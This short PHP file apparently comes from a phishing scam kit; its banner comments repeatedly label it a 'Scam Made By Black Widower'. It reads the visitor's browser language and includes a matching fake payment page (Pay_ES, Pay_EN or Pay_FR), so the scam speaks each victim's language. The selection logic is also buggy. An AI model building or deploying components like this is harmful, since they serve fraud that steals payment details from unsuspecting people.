<?php
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/

$HTTP_ACCEPT_LANGUAGE = $_SERVER['HTTP_ACCEPT_LANGUAGE'];

if ($HTTP_ACCEPT_LANGUAGE != ''){ 
    $idiomas = explode(",", $HTTP_ACCEPT_LANGUAGE);
    
    for ($i=0; $i<count($idiomas); $i++){
        if (!isset($idioma)){

            if (substr($idiomas[$i], 0, 2) == "es"){$idioma = "ES";}
			if (substr($idiomas[$i], 0, 2) == "en"){$idioma = "EN";}
            if (substr($idiomas[$i], 0, 2) == "fr"){$idioma = "FR";}
			
        } else { $idioma = "EN"; }
    }
}

include 'Pay_'.$idioma.'.php';

/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/

?>